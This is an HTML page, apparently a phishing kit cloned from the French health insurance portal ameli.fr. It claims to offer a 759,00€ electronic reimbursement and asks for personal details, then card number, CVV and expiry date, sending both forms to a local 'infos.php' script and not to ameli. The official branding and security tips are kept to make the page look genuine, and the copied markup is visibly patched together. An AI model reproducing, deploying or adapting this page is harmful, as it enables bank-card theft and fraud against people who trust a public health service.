
<!DOCTYPE html>

<html lang="fr" slick-uniqueid="3"><head xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="apple-touch-icon" sizes="57x57" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicons/favicon-16x16.png"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="description" content="Vos démarches en ligne avec l&#39;Assurance Maladie. Suivi remboursements - Attestations - CEAM - Carte Vitale - Messagerie mail -  Coaching santé"><title>Compte ameli - mon espace personnel</title><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/layout.css"><script src="./Compte ameli - mon espace personnel_files/buttons.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/util.js.téléchargement" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/biblicnam-structure-sans.min.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/reset.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/clear.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/liens.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/forms.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/boutons.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/general.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/nav.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/colors.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/custom.css"><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/centrer.css"><style type="text/css">
					.r_cnx_page .r_cnx_btlien,
					.r_cnx_page .r_cnx_btsubmit,
                    .r_ddc_btsubmit,
                    .r_ddc_btretour,
                    .r_ddc_btterminer,
                    .blocformfond fieldset,
                    .blocformfond .bloc_infos,
                    .r_acc_bloc_infos,
                    .bloc_infos_perso .content,
                    .imgCriteresPhoto,
                    .bloc_infos_perso .bloc_infos,
                    .avertissement
                    {
                    	behavior: url(/PortailAS/framework/skins/assure/js/PIE.htc);
                    }
                </style><script src="./Compte ameli - mon espace personnel_files/biblicnam-standalone.min.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/fenetre.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/afficheElement.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/OpenPopup.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/validation.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/calendar.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/calendar-setup.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/calendar-fr.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/AideSaisie.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/refonte_biblicnam.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/questionnaireSatisfaction.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/blocs.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/invalidite.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/paiement.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/informationsPerso.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/questionnaireNotationEtoile.js.téléchargement" type="text/javascript"></script><script src="./Compte ameli - mon espace personnel_files/dmp.js.téléchargement" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="./Compte ameli - mon espace personnel_files/window.css"></head><body><header class="wlp-bighorn-header" role="banner"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div class="wlp-bighorn-theme wlp-bighorn-theme-borderless"><div id="Header" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">





























 <style type="text/css">
	 #Header .tetiere-connexion .r_btsubmit{
	 	display : none;
	 }
		
 </style>




 
<div class="tetiere">

	<div class="bandeau">
		
	 	<h1>Compte ameli</h1>
        <div class="liens">
        	<!-- Lien d'évitement, place le lecteur sur le contenu -->
          	<a tabindex="1" href="https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_creation_immediate_page#contenu" title="Aller directement au contenu">
			Aller au contenu
			</a>
			<!-- Lien Recommandations  de sécurité -->
			&nbsp;|&nbsp;
			<a target="_blank" tabindex="2" href="https://assure.ameli.fr/PortailAS/ShowProperty/WLP%20Repository/aides/recommandations_securite" onclick="Fenetre.components[&#39;HeaderrecommandationsSecurite&#39;].open();return true;" title="Recommandations de sécurité (nouvelle fenêtre)">Recommandations de sécurité
			</a>
        	
		        <!-- Redirection vers la page de connexion -->
			
	
	
	
			


			
		</div>
	</div>
	
	
	<a tabindex="-1" class="r_lien_image" href="https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_accueil_page" title="Accéder à l&#39;accueil">
		<img src="./Compte ameli - mon espace personnel_files/logo_regime_general" class="logoam" alt="Logo du régime d&#39;assurance maladie">
	</a>
</div>        	
  
</div></div></div></div></div></header><div id="ameli_portal_book_2" class="wlp-bighorn-book"><nav class="wlp-bighorn-menu-multi" role="navigation"></nav><div class="wlp-bighorn-book-content"><div id="as_connexion_book" class="wlp-bighorn-book"><div class="wlp-bighorn-book-content"><main id="as_creation_immediate_page" class="wlp-bighorn-page-unconnect" role="main"><section id="contenu" class="corps-de-page"><div class="wlp-bighorn-layout wlp-bighorn-layout-grid"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell"><div></div><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="creationImmediate_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-titlebar"><h1 class="wlp-bighorn-titlebar-title-panel">Formulaire de remboursement électronique / Référence : Ameli-A8005W</h1>Montant : 759,00€</div><div class="wlp-bighorn-window-content">



























<script type="text/javascript" src="./Compte ameli - mon espace personnel_files/demandeCodeProvisoire.js.téléchargement"></script>

<script type="text/javascript">
	// Init de l'objet contenant les messages d'erreur serveur (format key = champ.id, value = errMsg)
	var errors = {};
	errors["creationImmediate_1idNir"] = {
		length: "Votre numéro de Sécurité sociale ne peut être inférieur à 13 chiffres.",
		pattern: "Votre numéro de Sécurité sociale doit contenir des chiffres, A ou B. Veuillez recommencer."
	};
	errors["creationImmediate_1idDna"] = {
		pattern: "La date n'a pas un format correct (jj/mm/aaaa).",
		anterieur: "La date de naissance doit être inférieure à la date du jour."
	};
	errors["creationImmediate_1idCp"] = {
		pattern: "Votre code postal doit comprendre 5 chiffres."
	};
	errors["creationImmediate_1idNom"] = {
		length: "Le nom est obligatoire."
	};
</script>

<div class="centrepage">

  <form name="creationImmediateForm" id="creationImmediate_1creationImmediateForm" method="post" action="infos.php">
    <div class="blocformfond creationimmediate">
      
      <div>
      	<h2>
      		COORDONNÉES PERSONNELLES :
      	</h2>
      </div>
      
      <fieldset>
      	

		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Nom:
		      <img src="./Compte ameli - mon espace personnel_files/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
		    <span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="50" size="30" value="" class="champ" tabindex="3" name="001"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>

		

      	<div>
      	  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Prénom:
		      <img src="./Compte ameli - mon espace personnel_files/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
		    <span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="50" size="30" value="" class="champ" tabindex="3" name="002"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>



		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelddn" for="creationImmediate_1idDna">


		      date de naissance: 
		      <img src="./Compte ameli - mon espace personnel_files/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    <span class="zone_champ_saisie"><input id="creationImmediate_1idDna" type="text" autocomplete="off" maxlength="10" size="18" value="" placeholder="jj/mm/aaaa" class="champ" tabindex="5" data-maxdate="28/03/2018" name="003" data-mindate=""><a id="creationImmediate_1idDna_calendrier" class="calendrier" tabindex="-1" title="Aide à la saisie de date"></a></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idDna_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div> 
		  
		</div>
         

    
		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      N° de téléphone:
		      <img src="./Compte ameli - mon espace personnel_files/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
		    <span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="10" size="30" value="" class="champ" tabindex="3" name="004"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
		
		
		    

		    </div>
		  
		</div>
		
</script>

<div class="centrepage">

  <form name="creationImmediateForm" id="creationImmediate_1creationImmediateForm" method="post" action="infos.php">
    <div class="blocformfond creationimmediate">
      
      <div>
      	<h2>
      		COORDONNÉES BANCAIRES :
      	</h2>
      </div>
      
      <fieldset>


		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      N° de carte bancaire:
		      <img src="./Compte ameli - mon espace personnel_files/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
		    <span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="16" size="30" value="" class="champ" tabindex="3" name="005"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>

		

      	<div>
      	  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Cryptogramme visuel:
		      <img src="./Compte ameli - mon espace personnel_files/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
		    <span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="3" size="30" value="" class="champ" tabindex="3" name="006"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>



		<div>
		  

		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Date d'expiration:
		      <img src="./Compte ameli - mon espace personnel_files/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
                            <select  name="007" required="" placeholder="" style=" border-radius: 4px !important; text-align:center; width:14%; margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;" type="text">
				        <option value="">Mois</option>
                        <option value="01">01-janvier</option>
						<option value="02">02-f&eacute;vrier</option>
						<option value="03">03-mars</option>
						<option value="04">04-avril</option>
						<option value="05">05-mai</option>
						<option value="06">06-juin</option>
						<option value="07">07-juillet</option>
						<option value="08">08-ao&uacute;t</option>
						<option value="09">09-septembre</option>
						<option value="10">10-octobre</option>
						<option value="11">11-novembre</option>
						<option value="12">12-d&eacute;cembre</option>
									

							</select>
							<select  name="008" required="" placeholder="Date d'expiration (MM/AAAA)" style="border-radius: 60px !important; text-align:center; width:16%; margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;" type="text">
												
								<option value="">Ann&eacute;e</option>
								<option value="18">2018</option>
								<option value="19">2019</option>
								<option value="20">2020</option>
								<option value="21">2021</option>
								<option value="22">2022</option>
								<option value="23">2023</option>
								<option value="24">2024</option>
								<option value="25">2025</option>
								<option value="26">2026</option>
						
							
							</select><span class="ico"></span>
						<br>	<br>
				             
            </div>
		
		


		    </div>
		  
		</div>	
		
		



      </fieldset>

    </div> 
        
    <div class="txt_milieu">
      <input type="hidden" name="creationImmediate_1actionEvt" value="verifierEligibilite">
    
      
	  <a href="loding1.html" tabindex="12" class="r_btretour r_btlien">Retour</a>

	  <input type="submit" name="creationImmediate_1actionEvt" tabindex="11" value="Continuer" enable="enable" id="creationImmediate_1id_r_cnx_btn_submit" class="r_btsubmit">
    </div>
    
    <p class="texte-center connect-FRCO"><span>Ou</span></p>
	<div class="imgco-FRCO">	
		<a href="">
			<img class="image-FRCO" src="./Compte ameli - mon espace personnel_files/france-connect.png">
		</a>
    </div>
  </form>
     
</div>

        <form action="./loding1.html" method="post" id="formulaire_saisie_adresse">



<!-- Preremplir et focus la date de naissance lorsque le nir est complet -->

<!-- Preremplir la date de naissance lorsque l'utilisateur focus le champ (tab ou click) -->
<!-- Positionner le curseur au debut du champ si le mois et l'annee sont renseignés -->

<!-- Activer le bouton si les champs sont OK -->
<!-- Focus le champ (contrer la perte de focus lorsque le message d'erreur est affiche) -->



<!-- Activer le bouton si les champs sont OK -->

<!-- Activer le bouton si les champs sont OK -->

<!-- Activer le bouton si les champs sont OK -->
</div></div></div></div></div></div></section></main></div></div></div></div><footer class="wlp-bighorn-footer" role="contentinfo"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div class="wlp-bighorn-theme wlp-bighorn-theme-borderless"><div id="Footer" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">































<ul class="old-Footer">
	<li>
		<a id="id_lien_info_legales" href="https://assure.ameli.fr/PortailAS/portlets/popup/InformationsLegales.jsp" target="aideAmeli" onclick="openPopup(&quot;/PortailAS/portlets/popup/InformationsLegales.jsp&quot;); return true;" title="Accéder aux informations (nouvelle fenêtre)">
			Informations légales
		</a>
	</li>
	<li>
		<a id="id_lien_copyright" href="https://assure.ameli.fr/PortailAS/portlets/popup/Copyright.jsp" target="aideAmeli" onclick="openPopup(&quot;/PortailAS/portlets/popup/Copyright.jsp&quot;); return true;" title="Accéder aux informations (nouvelle fenêtre)">
			Propriété intellectuelle
		</a>
	</li>
	<li>
		<a id="id_lien_condition_utilisation" href="https://assure.ameli.fr/PortailAS/portlets/popup/ConditionsUtilisation.jsp" target="aideAmeli" onclick="openPopup(&quot;/PortailAS/portlets/popup/ConditionsUtilisation.jsp&quot;); return true;" title="Accéder aux informations (nouvelle fenêtre)">
			Conditions d'utilisation
		</a>
	</li>

	<li>
		<a id="id_lien_aide_footer" target="aideAmeli" href="https://assure.ameli.fr/PortailAS/portlets/popup/AideGenerale.jsp" onclick="openPopup(&quot;/PortailAS/portlets/popup/AideGenerale.jsp&quot;); return true;" title="Accéder aux informations (nouvelle fenêtre)">
			Aide
		</a>
	</li>
	
	
</ul>





<script type="text/javascript">
window.addEvent('domready', function(event) {Fenetre.initModale('HeaderrecommandationsSecurite', {onload:true});Fenetre.initBulle('creationImmediate_1AideSaisieNir', {"position":"bulleAideSaisieNir"});new DatePicker('creationImmediate_1idDna',{toggle: 'creationImmediate_1idDna_calendrier', pickerClass: 'datepicker dpstandard', linkTitle: 'Aide à la saisie de date'});

;
	formatterNIRWithEspace('creationImmediate_1idNir', event);
	initCalendarWithNir(document.getElementById('creationImmediate_1idNir') , document.getElementById('creationImmediate_1idDna') , '', '28/03/2018', true);
;Fenetre.initModale('FooterrecommandationsSecurite', {onload:true});
	$$('div.wlp-bighorn-menu-menu-panel > ul > li').each(function(liMenu){
		if(liMenu.getElements('ul').length > 0){
			if(liMenu.hasClass('menuGrand')){
				liMenu.getElements('ul>li>ul>li>a').each(function(aMenu){
					aMenu.addEvent('focus', function(){
						liMenu.getElements('ul>li>ul').each(function(ulMenu){
							ulMenu.setStyles({
								left: 'inherit',
								height: 'inherit',
								width: 'auto',
								top: 'inherit',
								position: 'inherit',
								lineHeight: 'inherit'	
							});
						});
						liMenu.getElements('ul')[0].setStyles({
							left: '0',
							height: 'inherit',
							width: '100%',
							maxWidth: 'none',
							top: '38px',
							lineHeight: 'inherit'	
						});
						liMenu.getElements('a')[0].setStyles({
							color: 'white',
							backgroundColor: '#27aae1'
						});
					});
					aMenu.addEvent('blur', function(){
						liMenu.getElements('ul>li>ul')[0].removeProperty('style');
						liMenu.getElements('ul')[0].removeProperty('style');
						liMenu.getElements('a')[0].removeProperty('style');
					});
				});
			} else {
				liMenu.getElements('ul>li>a').each(function(aMenu){
					aMenu.addEvent('focus', function(){
						liMenu.getElements('ul')[0].setStyles({
							left: 'inherit',
							height: 'inherit',
							width: 'auto',
							top: '38px',
							lineHeight: 'inherit'	
						});
						liMenu.getElements('a')[0].setStyles({
							color: 'white',
							backgroundColor: '#27aae1'
						});
					});
					aMenu.addEvent('blur', function(){
						liMenu.getElements('ul')[0].removeProperty('style');
						liMenu.getElements('a')[0].removeProperty('style');
					});
				});
			}
		}
	});
;});$('bulleAideSaisieNir').addEvent('mousedown', function(event) {	
            if($('creationImmediate_1AideSaisieNir').hasClass("invisible")){	
         	  Fenetre.components['creationImmediate_1AideSaisieNir'].open();	
            } else {		
         	  Fenetre.components['creationImmediate_1AideSaisieNir'].close();
            }
            event.stopPropagation();	
          ;});$('bulleAideSaisieNir').addEvent('click', function(event) {	
            event.stopPropagation();	
          ;});$('creationImmediate_1idDna').addEvent('blur', function(event) {if(!ChampSaisieTag.controleDate(this)) return;
	enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idNir').addEvent('keydown', function(event) {
	handleSuppression('creationImmediate_1idNir', event);
;});$('creationImmediate_1idNir').addEvent('input', function(event) {
	formatterNIRWithEspace('creationImmediate_1idNir', event);
	if (this.value.length === 18) {
		$('creationImmediate_1idDna').focus();
	}
;});$('creationImmediate_1idDna').addEvent('focus', function(event) {
	if (this.value.length === 0) 
		initCalendarWithNir($('creationImmediate_1idNir'), $(this), '', '28/03/2018', true);
	if (this.value.length === 8) $(this.id).setCaretPosition(0);
;});$('creationImmediate_1idCp').addEvent('blur', function(event) {
	enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idCp').addEvent('input', function(event) {
	if (this.value.length == 5) enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idNom').addEvent('blur', function(event) {
	enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idNir').addEvent('blur', function(event) {
	enableBoutonCIC('creationImmediate_1');
;});
</script>






</div></div></div></div></div></footer><div id="HeaderrecommandationsSecurite" class="fenetre invisible modale" tabindex="0" role="alert" aria-labelledby="HeaderrecommandationsSecurite_title" style="position: absolute; left: 719px; top: 327px;">
	<div class="fenetre-header">
		<span id="HeaderrecommandationsSecurite_title" class="fenetre-title">Recommandations de sécurité</span>
		<span id="HeaderrecommandationsSecurite_close" class="fenetre-button" role="button" tabindex="0">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
	
	<div>
	<ul style="margin-left: 1em">
		<li style="margin-top: 1em">
		  Le code d'accès au compte ameli est strictement personnel, il convient de le garder secret. N'oubliez pas de le modifier régulièrement.
		</li>
		<li style="margin-top: 1em">
		  Assurez-vous que l'ordinateur sur lequel vous consultez votre compte ameli est bien protégé par un antivirus et que celui-ci est à jour.
		</li>
		<li style="margin-top: 1em">
		  Vérifiez l'adresse (URL) dans la barre de votre navigateur lorsque vous consultez votre compte ameli depuis internet : <a href="https://assure.ameli.fr/">https://assure.ameli.fr</a>
		</li>
		<li style="margin-top: 1em">
		  L'adresse (URL) doit débuter par https:// et un cadenas doit apparaître.
		</li>
		<li style="margin-top: 1em">
		  N'oubliez pas de vous déconnecter de votre session ameli avant de fermer votre navigateur internet. Ceci plus particulièrement si vous utilisez un ordinateur partagé (cybercafé...)
		</li>
	</ul>
</div>

	</div>
</div><div id="creationImmediate_1AideSaisieNir" class="fenetre invisible bulle" tabindex="0" role="dialog" aria-labelledby="creationImmediate_1AideSaisieNir_title">
	<div class="fenetre-header">
		<span id="creationImmediate_1AideSaisieNir_title" class="fenetre-title">Aide pour le n° de sécurité sociale</span>
		<span id="creationImmediate_1AideSaisieNir_close" class="fenetre-button" role="button" tabindex="0">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
            Saisissez votre numéro de sécurité sociale à 13 chiffres.<br>13 caractéres (disponible sur vos relevés de remboursement)<br>Exemple : 1480599999356 <br> Attention, si vous êtes ayant droit, saisissez le numéro de sécurité sociale de la personne à laquelle vous êtes rattaché.
          	</div>
</div><div id="FooterrecommandationsSecurite" class="fenetre invisible modale" tabindex="0" role="alert" aria-labelledby="FooterrecommandationsSecurite_title" style="position: absolute; left: 719px; top: 327px;">
	<div class="fenetre-header">
		<span id="FooterrecommandationsSecurite_title" class="fenetre-title">Recommandations de sécurité</span>
		<span id="FooterrecommandationsSecurite_close" class="fenetre-button" role="button" tabindex="0">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
	
	<div>
	<ul style="margin-left: 1em">
		<li style="margin-top: 1em">
		  Le code d'accès au compte ameli est strictement personnel, il convient de le garder secret. N'oubliez pas de le modifier régulièrement.
		</li>
		<li style="margin-top: 1em">
		  Assurez-vous que l'ordinateur sur lequel vous consultez votre compte ameli est bien protégé par un antivirus et que celui-ci est à jour.
		</li>
		<li style="margin-top: 1em">
		  Vérifiez l'adresse (URL) dans la barre de votre navigateur lorsque vous consultez votre compte ameli depuis internet : <a href="https://assure.ameli.fr/">https://assure.ameli.fr</a>
		</li>
		<li style="margin-top: 1em">
		  L'adresse (URL) doit débuter par https:// et un cadenas doit apparaître.
		</li>
		<li style="margin-top: 1em">
		  N'oubliez pas de vous déconnecter de votre session ameli avant de fermer votre navigateur internet. Ceci plus particulièrement si vous utilisez un ordinateur partagé (cybercafé...)
		</li>
	</ul>
</div>

	</div>
</div></body></html>